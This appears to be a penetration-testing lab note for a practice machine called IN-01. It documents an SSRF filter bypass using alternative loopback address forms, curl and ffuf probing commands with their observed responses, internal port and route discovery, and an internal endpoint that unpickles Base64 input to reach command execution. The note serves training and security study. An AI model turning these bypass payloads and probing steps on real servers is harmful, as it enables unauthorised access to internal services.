---
type: reusable-poc
project: OSCP-Exam-PoC
status: validated
updated: "2026-11-06"
related_machines:
  - IN-01
tags:
  - oscp
  - ssrf
  - url-validation
  - loopback
  - internal-service-discovery
---
# SSRF Filter Bypass

## 1. Overview

IN-01 exposes a URL-fetching endpoint that retrieves a supplied URL and returns the fetched content.

The application claims to block internal addresses:

```
IT GATE Link Preview

Preview any public URL:

GET /fetch?url=https://example.com

Internal addresses are blocked for security.
```

The vulnerability is caused by inconsistent interpretation of loopback addresses between the application's URL filter and its HTTP client.

The filter blocks conventional representations of localhost but allows alternative IPv4 representations that resolve to the same loopback address.

**Confirmed bypass:** `127.1`

Other confirmed accepted representations:

- `2130706433`
    
- `0x7f000001`
    
- `0177.0.0.1`
    

These allowed the fetcher to attempt connections to loopback services.

## 2. Attack Surface

The exposed endpoint follows this structure:

```
GET /fetch?url=<destination>
```

Example:

```
GET /fetch?url=https://example.com
```

The application performs the request server-side and returns the resulting content.

### Baseline verification

Use the current instance's assigned address:

```
TARGET='http://TARGET_IP:HTTP_PORT/fetch'
```

Test a known public destination:

```
curl -i -G \
  --data-urlencode 'url=https://example.com' \
  "$TARGET"
```

Confirmed response:

```
HTTP/1.1 200 OK
Server: gunicorn
Content-Type: text/html; charset=utf-8; charset=utf-8
Content-Length: 577
```

The body contained the actual HTML returned by Example Domain.

**Conclusion:** The endpoint performs server-side HTTP requests and returns fetched content. This confirms the SSRF functionality, independently of the internal-address filter bypass.

## 3. Identify the Filter Bypass

### 3.1 Initial payload matrix

The following representations were tested:

|Destination|Result|Interpretation|
|---|---|---|
|`127.0.0.1`|403|Blocked|
|`localhost`|403|Blocked|
|`::1`|403|Blocked|
|`127.1`|502|Passed validation; connection attempted|
|`2130706433`|502|Passed validation; connection attempted|
|`0x7f000001`|502|Passed validation; connection attempted|
|`0177.0.0.1`|502|Passed validation; connection attempted|

### 3.2 Reproduce the test

```
TARGET='http://TARGET_IP:HTTP_PORT/fetch'

for candidate_url in \
    'http://127.0.0.1/' \
    'http://localhost/' \
    'http://127.1/' \
    'http://2130706433/' \
    'http://0x7f000001/' \
    'http://0177.0.0.1/' \
    'http://[::1]/'
do
    printf '\n========== %s ==========\n' "$candidate_url"

    curl -sS -i -G --max-time 10 \
        --data-urlencode "url=$candidate_url" \
        "$TARGET"
done
```

### 3.3 Interpret the responses

The important evidence was the response body, not merely the HTTP status.

For `127.1`:

```
HTTP/1.1 502 BAD GATEWAY
Server: gunicorn
Content-Length: 230
```

Response body:

```
fetch error: HTTPConnectionPool(host='127.1', port=80):
Max retries exceeded with url: /
(Caused by NewConnectionError(
"HTTPConnection(host='127.1', port=80):
Failed to establish a new connection: [Errno 111] Connection refused"))
```

This proves that:

1. The application did not reject the URL as an internal address.
    
2. The HTTP client attempted to connect to the supplied destination.
    
3. The connection was refused because nothing was listening on loopback port 80.
    

The `502` is the external fetcher's response to its failed upstream connection. It is not evidence that the URL was blocked by the validation filter.

**Result: SSRF filter bypass confirmed.**

## 4. Automate the Bypass Test with FFUF

A small wordlist was used rather than a large directory-discovery list.

The original file on Kali was:

```
~/Desktop/IN01/ssrf-urls.txt
```

Its contents:

```
https://example.com
http://127.0.0.1/
http://localhost/
http://127.1/
http://2130706433/
http://0x7f000001/
http://0177.0.0.1/
http://[::1]/
```

The confirmed FFUF command:

```
ffuf \
  -w ~/Desktop/IN01/ssrf-urls.txt:URL \
  -u 'http://TARGET_IP:HTTP_PORT/fetch?url=URL' \
  -enc 'URL:urlencode' \
  -mc all \
  -t 3 \
  -rate 3 \
  -timeout 10 \
  -of json \
  -o ~/Desktop/IN01/ssrf-results.json
```

### Observed results

|Payload|HTTP status|Response size|
|---|---|---|
|`https://example.com`|200|577|
|`127.0.0.1`|403|25|
|`localhost`|403|25|
|`127.1`|502|230|
|`2130706433`|502|240|
|`0x7f000001`|502|240|
|`0177.0.0.1`|502|240|
|`[::1]`|403|25|

The response differences identified the alternative representations worth investigating.

A changed status or response size alone is not sufficient proof. Inspect the response body to distinguish validation rejection from an attempted internal connection.

## 5. Internal Service Discovery

After confirming the bypass, the next stage was identifying services reachable from the fetcher's loopback interface.

### 5.1 Internal port discovery

A TCP port list was generated from the local Kali services database:

```
awk '$2 ~ /^[0-9]+\/tcp$/ {
    split($2, port_parts, "/");
    print port_parts[1]
}' /etc/services | sort -nu > ~/Desktop/IN01/tcp-ports.txt
```

The resulting list was used to probe loopback ports through the vulnerable fetcher.

The significant discoveries were:

|Internal port|Finding|Assessment|
|---|---|---|
|22|OpenSSH 10.0p2 banner|SSH service confirmed|
|8080|Connection accepted, but HTTP and HTTPS requests timed out|Not a useful HTTP lead|
|9000|Internal admin API banner|Primary target|

### 5.2 Port 9000 identification

The fetcher reached:

```
http://127.1:9000/
```

The response body was:

```
IT GATE internal admin API (localhost only)
```

Response size:

```
44 bytes
```

This established a reachable internal HTTP service.

The service was not directly exposed through Kali's loopback interface. The request had to pass through the vulnerable public `/fetch` endpoint.

### 5.3 Important distinction

These destinations are not equivalent:

|Request origin|Destination|
|---|---|
|Kali browser or terminal|`127.1:9000` means Kali's own loopback|
|Kali browser or terminal|`TARGET_IP:9000` means the public target address and port|
|Target's `/fetch` application|`127.1:9000` means the target's loopback service|

The SSRF endpoint provides the third behavior.

## 6. Internal API Route Discovery

The service on port 9000 returned the same generic response for nonexistent paths.

A deliberately nonexistent route was used as the negative control:

```
curl -sS --max-time 7 -G \
  --data-urlencode 'url=http://127.1:9000/definitely-not-a-real-route-94821' \
  -w '\nHTTP=%{http_code} SIZE=%{size_download} TIME=%{time_total}s\n' \
  "$TARGET"
```

Confirmed baseline:

```
HTTP=404
SIZE=207
```

An initial 34-path scan produced identical 207-byte 404 responses.

A larger generic wordlist was not useful. A targeted administrative route list was more productive.

### 6.1 Route discovered

The targeted scan identified:

```
/admin/exec
```

Observed result:

```
Status: 400
Size: 23
```

A direct request returned:

```
HTTP/1.1 400 BAD REQUEST

error: Ran out of input
```

This was materially different from the generic 404 response.

### 6.2 Parameter discovery

Parameter fuzzing identified `data` as the relevant input parameter.

Request:

```
curl -sS --max-time 6 -i -G \
  --data-urlencode 'url=http://127.1:9000/admin/exec?data=x' \
  "$TARGET"
```

Response:

```
HTTP/1.1 400 BAD REQUEST
Content-Length: 105

error: Invalid base64-encoded string:
number of data characters (1) cannot be 1 more than a multiple of 4
```

An empty value produced:

```
error: Ran out of input
```

These responses established that the handler was Base64-decoding the supplied input before deserialization.

The subsequent investigation confirmed Python Pickle deserialization and remote command execution as:

```
uid=1000(web) gid=1000(web) groups=1000(web)
web
/opt/app
```

The exploitation payload and command-execution procedure belong in [[Reusable PoCs/Python Pickle/Python Pickle RCE]].

## 7. Confirmed IN-01 Attack Chain

```
Public link-preview endpoint
          |
          v
/fetch?url=
          |
          v
Internal-address filter
          |
          v
Non-canonical loopback representation
127.1
          |
          v
SSRF filter bypass
          |
          v
Internal port discovery
          |
          v
127.1:9000
          |
          v
IT GATE internal admin API
          |
          v
/admin/exec
          |
          v
data parameter
          |
          v
Base64 decoding
          |
          v
Python Pickle deserialization
          |
          v
Remote command execution as web
```

## 8. Limitations and Failed Leads

### Port 80

The alternative loopback representations passed validation, but port 80 refused the connection. This confirmed the bypass, not an HTTP service on port 80.

### Port 8080

The service accepted connections but returned read timeouts for HTTP and HTTPS requests.

A large directory wordlist was attempted against it:

```
227 / 4600+
220 errors
15 minutes elapsed
```

The scan was stopped. The service had not been identified as a useful HTTP application.

### Generic API wordlists

The initial 34 route candidates all returned the same generic 404 response.

The larger API wordlist also produced no useful results when automatic calibration filtered the generic responses.

The targeted route list eventually identified `/admin/exec`.

### Redirect testing

Standard public redirect testing did not provide the successful route. The direct non-canonical loopback representation was the useful bypass.

Further redirect experiments should not be repeated unless a new observation justifies them.

## 9. Reusable Lessons

1. Compare equivalent address representations when investigating URL-validation filters.
    
2. Inspect the body of a `502` response; it may expose a connection attempt rather than a validation rejection.
    
3. Establish a public-fetch baseline before testing internal destinations.
    
4. Use a negative-control route before applying response-size filters to API fuzzing.
    
5. Identify useful internal services before performing directory enumeration.
    
6. Separate route fuzzing from parameter fuzzing. Once `/admin/exec` was discovered, the productive target became its input contract.
    
7. Do not interpret an empty FFUF result without checking calibration and filtering.
    
8. Do not keep scanning services that consistently time out without providing useful protocol responses.
    
9. Preserve exact response bodies. They often reveal more than status codes.
    
10. Keep the SSRF bypass and Pickle exploitation as separate reusable techniques.
    

## Related Notes

- [[Methodology/SSRF]]
    
- [[Reusable PoCs/Python Pickle/Python Pickle RCE]]
    
- [[Difficulty Levels/Insane/IN-01/IN-01 Overview]]
    
- [[Difficulties & Lessons/Fuzzing Strategy and False Leads]]
    
- [[Difficulties & Lessons/HTTP Client and Connectivity Failures]]